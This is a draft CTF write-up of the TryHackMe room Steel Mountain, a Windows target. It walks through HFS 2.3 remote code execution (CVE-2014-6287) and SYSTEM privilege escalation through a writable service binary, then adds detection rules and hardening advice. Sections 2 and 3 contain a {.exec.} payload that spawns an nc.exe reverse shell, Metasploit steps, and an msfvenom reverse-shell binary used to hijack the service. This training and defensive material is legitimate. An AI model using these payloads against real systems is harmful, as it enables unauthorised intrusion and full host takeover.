---
title: "WriteUp: Steel Mountain — TryHackMe | Easy"
slug: writeup-thm-steel-mountain
status: draft
tags: [ctf-writeup, tryhackme, teaser]
excerpt: "An easy Windows machine covering HFS 2.3 RCE (CVE-2014-6287) and unquoted service path privilege escalation. Full walkthrough in preparation."
format: html  # body is Ghost-ready HTML; restore via Admin API posts?source=html
---

<h1 id="steel-mountain-%E2%80%94-tryhackme">Steel Mountain — TryHackMe</h1><blockquote><strong>Preparation stub.</strong> Based on publicly documented information about this retired room — not an<br>original solve, and no live flag values are recorded. Complete the bracketed fields when working<br>the room under your own account. Only document legally authorised activity.</blockquote><h2 id="engagement-metadata">Engagement metadata</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Platform</td>
<td>TryHackMe</td>
</tr>
<tr>
<td>Room</td>
<td>Steel Mountain</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Easy–Medium</td>
</tr>
<tr>
<td>Category</td>
<td>Windows</td>
</tr>
<tr>
<td>Target IP</td>
<td>10.x.x.x (lab-assigned)</td>
</tr>
<tr>
<td>Date completed</td>
<td>[YYYY-MM-DD]</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="executive-summary">Executive summary</h2><p>A Windows server running <strong>Rejetto HttpFileServer (HFS) 2.3</strong>, vulnerable to unauthenticated remote<br>code execution. Exploitation gives a user shell; privilege escalation abuses an <strong>insecure Windows</strong><br><strong>service</strong> (identified with PowerUp) to run a malicious binary as SYSTEM. Teaches Windows<br>service-misconfiguration privesc, and the room is designed to be solved both with and without<br>Metasploit.</p><h2 id="scenario-value-study-scaffold">Scenario value (study scaffold)</h2><ul><li><strong>What it tests:</strong> mapping a service banner (Rejetto HFS 2.3) to a known CVE, and Windows<br>service-misconfiguration privilege escalation.</li><li><strong>What completing it demonstrates:</strong> both the Metasploit <em>and</em> the manual <code>{.exec.}</code> exploitation<br>paths, plus PowerUp-driven privesc on an insecure/writable service binary (MITRE T1190 → T1543.003<br>/ T1574.009) — the room is explicitly designed to be solved both ways.</li></ul><h2 id="key-vulnerability-class">Key vulnerability class</h2><ul><li><strong>Foothold:</strong> Rejetto <strong>HFS 2.3</strong> RCE via the <code>{.exec.}</code> macro in the search parameter —<br><strong>CVE-2014-6287</strong>. <em>Verify CVE when citing.</em></li><li><strong>Privesc:</strong> insecure Windows <strong>service</strong> — commonly the bundled <code>AdvancedSystemCareService9</code><br>(Advanced SystemCare) with a <strong>writable binary path</strong> (and/or <strong>unquoted service path</strong>),<br>exploitable by replacing the service executable and restarting it (CWE-732 / CWE-428 unquoted<br>search path).</li></ul><h2 id="1-reconnaissance">1. Reconnaissance</h2><pre><code>nmap -sC -sV -p- -oA nmap/steelmountain 10.x.x.x
</code></pre><p>Expected exposed surface (confirm on completion):</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>80/tcp</td>
<td>http (IIS)</td>
<td>Landing page — image reveals an employee-of-the-month name (room hint)</td>
</tr>
<tr>
<td>8080/tcp</td>
<td>http</td>
<td><strong>HttpFileServer 2.3 — the foothold</strong></td>
</tr>
<tr>
<td>3389/tcp</td>
<td>ms-wbt-server</td>
<td>RDP</td>
</tr>
<tr>
<td>135/139/445</td>
<td>msrpc/smb</td>
<td>Windows services</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><ul><li>Browse <code>:8080</code> and confirm the banner reads <strong>"HttpFileServer 2.3"</strong>. [Paste scan output on<br>completion.]</li></ul><p><strong>nmap flag rationale:</strong></p><ul><li><code>-p-</code> — all 65,535 TCP ports. The HFS instance is on <strong>8080</strong>, not a standard web port; full-port<br>scanning is what surfaces it alongside the decoy IIS site on 80.</li><li><code>-sV</code> — version detection. The decisive output is the banner <strong>"HttpFileServer 2.3"</strong> → maps<br>directly to CVE-2014-6287; the version string is the whole foothold.</li><li><code>-sC</code> — default scripts; <code>http-title</code> and <code>http-server-header</code> confirm HFS vs IIS quickly.</li><li><code>-oA nmap/steelmountain</code> — keep the banner evidence.</li></ul><p><strong>What to look for in the scan:</strong> the exact string <strong>"HttpFileServer 2.3"</strong> (or "HFS 2.3") on the<br>8080 banner — that single fact is the CVE-2014-6287 trigger. Also note the port-80 landing page<br>whose image leaks an "employee of the month" name (a room hint, not the path). Confirm the version<br>before anything else; everything downstream depends on it.</p><h2 id="2-exploitation-hfs-23-rce">2. Exploitation (HFS 2.3 RCE)</h2><p>The foothold maps a banner to a known RCE: triggering the <code>{.exec.}</code> macro is <strong>[ATT&amp;CK T1190 —</strong><br><strong>Exploit Public-Facing Application]</strong>, and the downloaded payload executing is <strong>[ATT&amp;CK T1059 —</strong><br><strong>Command and Scripting Interpreter]</strong>.</p><p><strong>Manual path (recommended for understanding):</strong> host a Netcat binary and a payload over a Python<br>web server, then trigger the <code>{.exec.}</code> macro to download and run it.</p><pre><code># attacker box
python3 -m http.server 80          # serve nc.exe
nc -lvnp 4444                       # catch the shell

# trigger via the HFS search field (URL-encoded {.exec.} payload), e.g.
#   /?search=%00{.exec|c%3A%5CWindows%5CTemp%5Cnc.exe -e cmd.exe &lt;tun0 ip&gt; 4444.}
</code></pre><p><strong>Metasploit path:</strong></p><pre><code>use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.x.x.x
set RPORT 8080
set LHOST &lt;tun0 ip&gt;
exploit
</code></pre><ul><li><strong>User flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="3-privilege-escalation-insecure-service">3. Privilege escalation (insecure service)</h2><pre><code class="language-powershell"># upload and run PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
</code></pre><ul><li>PowerUp flags a service whose executable path is <strong>writable by the current user</strong> (and/or<br>unquoted) — typically <code>AdvancedSystemCareService9</code>. Confirm with native tools:</li></ul><pre><code>sc qc AdvancedSystemCareService9          # inspect BINARY_PATH_NAME
accesschk.exe -wuvc AdvancedSystemCareService9
</code></pre><ul><li>Generate a replacement binary, overwrite the service executable, and restart the service so it<br>runs the payload as <strong>SYSTEM</strong> <strong>[ATT&amp;CK T1543.003 — Create or Modify System Process: Windows</strong><br><strong>Service; T1574.009 — Hijack Execution Flow: Unquoted/Trusted Path]</strong>:</li></ul><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;tun0 ip&gt; LPORT=5555 -f exe -o ASCService.exe
# upload over the writable path, then:
sc stop  AdvancedSystemCareService9
sc start AdvancedSystemCareService9       # service runs as SYSTEM → payload fires
</code></pre><ul><li><strong>Root/admin flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="4-tools-used">4. Tools used</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Phase</th>
<th>Tools</th>
</tr>
</thead>
<tbody>
<tr>
<td>Recon</td>
<td><code>nmap</code> (<code>-sC -sV -p-</code>)</td>
</tr>
<tr>
<td>Exploitation</td>
<td>Metasploit (<code>rejetto_hfs_exec</code>) <strong>or</strong> manual <code>{.exec.}</code> payload + <code>nc</code> + <code>python3 -m http.server</code></td>
</tr>
<tr>
<td>Privesc enumeration</td>
<td><strong>PowerUp.ps1</strong> (PowerSploit), <code>sc qc</code>, <code>accesschk</code></td>
</tr>
<tr>
<td>Privesc exploitation</td>
<td><code>msfvenom</code> (payload), <code>sc stop/start</code></td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="5-mitre-attck-mapping">5. MITRE ATT&amp;CK mapping</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>ID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Initial Access</td>
<td>Exploit Public-Facing Application</td>
<td>T1190</td>
</tr>
<tr>
<td>Execution</td>
<td>Command and Scripting Interpreter</td>
<td>T1059</td>
</tr>
<tr>
<td>Privilege Escalation</td>
<td>Create or Modify System Process: Windows Service</td>
<td>T1543.003</td>
</tr>
<tr>
<td>Privilege Escalation</td>
<td>Hijack Execution Flow: Unquoted Path</td>
<td>T1574.009</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="6-key-learnings">6. Key learnings</h2><ul><li><strong>Service-binary permissions are a top Windows privesc vector</strong> — if a low-priv user can write the<br>service's executable (or exploit an unquoted path), they can run code as SYSTEM on restart.</li><li><strong>PowerUp/winPEAS pay for themselves</strong> — automated checks surface writable services, unquoted<br>paths, and <code>AlwaysInstallElevated</code> quickly; always verify a flagged finding with <code>sc qc</code> +<br><code>accesschk</code> before acting.</li><li><strong>Know both routes</strong> — Metasploit <em>and</em> a manual <code>{.exec.}</code> payload; the manual path builds<br>understanding and works when Metasploit is disallowed (the room's second task explicitly asks for<br>the manual solve).</li><li><strong>Blue-team transfer:</strong> MITRE <strong>T1574.009</strong> (unquoted path) / <strong>T1543.003</strong> (Windows service);<br>detect via service-binary modification and unexpected service restarts. Control: restrict write<br>permissions on service binaries and quote all service paths.</li></ul><h2 id="7-defender-perspective-%E2%80%94-logs-detection">7. Defender perspective — logs &amp; detection</h2><p>What this attack looks like from a monitored SOC, and the rule that would catch it. (See<br><a href="../methodology/ctf-methodology.md">../methodology/ctf-methodology.md §7</a>.)</p><p><strong>Log artefacts generated:</strong></p><ul><li><strong>HFS / web logs:</strong> a request to the search endpoint containing the URL-encoded <code>{.exec|...}</code><br>macro — the literal <code>{.exec.}</code> string in a query is the exploit and never appears in normal use.</li><li><strong>Process telemetry (Sysmon ID 1):</strong> <code>hfs.exe</code> spawning <code>cmd.exe</code>/<code>nc.exe</code>/<code>powershell.exe</code><br>(the foothold), and later <code>services.exe</code> spawning the <strong>replaced service binary</strong> as SYSTEM (the<br>privesc). The parent→child anomaly is the signal in both stages.</li><li><strong>Service tampering (the strongest privesc signal):</strong> Windows <strong>System Event ID 7045</strong> (a new<br>service installed) and/or <strong>7040/7036</strong> (service start-type/state change), plus the service<br>binary file being overwritten — Sysmon <strong>Event ID 11 (FileCreate)</strong> on the service's exe path,<br>outside any patch window.</li><li><strong>PowerUp/accesschk enumeration</strong> itself spawns <code>powershell.exe</code> with suspicious reflection and<br>reads service ACLs — detectable via PowerShell <strong>Script Block Logging (Event ID 4104)</strong>.</li><li><strong>Network:</strong> two reverse shells (user, then SYSTEM) outbound from the host.</li></ul><p><strong>Example detection logic (Sigma-style):</strong></p><pre><code class="language-yaml">title: Rejetto HFS RCE + insecure-service privesc
detection:
  rce:
    Image|endswith: '\hfs.exe'      # as ParentImage spawning a shell
    ChildImage|endswith: ['\cmd.exe', '\nc.exe', '\powershell.exe']
  service_tamper:
    EventID: [7045, 7040]           # new / modified service
  bin_overwrite:
    EventID: 11                     # Sysmon FileCreate on a service exe path
  condition: rce OR (service_tamper AND bin_overwrite)
level: critical
</code></pre><p><strong>Why it fires:</strong> the <code>{.exec.}</code> string is unambiguously malicious in a URL, and a service binary<br>being overwritten then restarted (7045/7040 + FileCreate on the exe) is the textbook insecure-<br>service privesc — there is no legitimate workflow that rewrites a running service's executable from<br>a user context. Web log catches <em>delivery</em>, Event 7045 catches <em>escalation</em>. Maps to <strong>ATT&amp;CK</strong><br><strong>T1190 / T1059 / T1543.003 / T1574.009</strong>.</p><p><strong>Defensive controls:</strong> patch/replace Rejetto HFS; restrict write permissions on all service<br>binaries and their parent directories; quote all service paths; run web apps as low-privilege<br>accounts; alert on Event 7045 and on service-binary file modifications.</p><h2 id="exam-relevance-%E2%80%94-sec-sy0-701">Exam relevance — Sec+ SY0-701</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>SY0-701 objective</th>
<th>How Steel Mountain makes it concrete</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>2.3</strong> Vulnerability types</td>
<td>Vulnerable software (HFS 2.3 / Rejetto RCE) <em>and</em> a service misconfiguration (unquoted service path) — two distinct Domain 2 vulnerability categories in one box.</td>
</tr>
<tr>
<td><strong>2.4</strong> Indicators of malicious activity</td>
<td>The RCE payload and the spawned reverse shell are the application-attack indicators the exam asks you to spot.</td>
</tr>
<tr>
<td><strong>2.5 / 4.1</strong> Mitigation &amp; hardening</td>
<td>Patch the vulnerable service; quote service paths and fix weak permissions — the configuration-management answers, from the attacker's side.</td>
</tr>
<tr>
<td><strong>4.x</strong> Privilege escalation</td>
<td>PowerUp's discovery of the unquoted/weak-permission service is automated privesc enumeration — the practical form of the exam's host-hardening material.</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p><strong>Interview line:</strong> "Steel Mountain is two exam concepts at once — a CVE in vulnerable software and an<br>unquoted-service-path misconfiguration — which is why I use it to revise why Domain 2 separates<br>'vulnerable software' from 'misconfiguration'."</p><h2 id="8-references">8. References</h2><ul><li>Rejetto HFS 2.3 CVE-2014-6287 (verify before citing).</li><li>PowerSploit / PowerUp documentation; unquoted-service-path guidance.</li><li>MITRE ATT&amp;CK T1190, T1059, T1543.003, T1574.009.</li></ul>
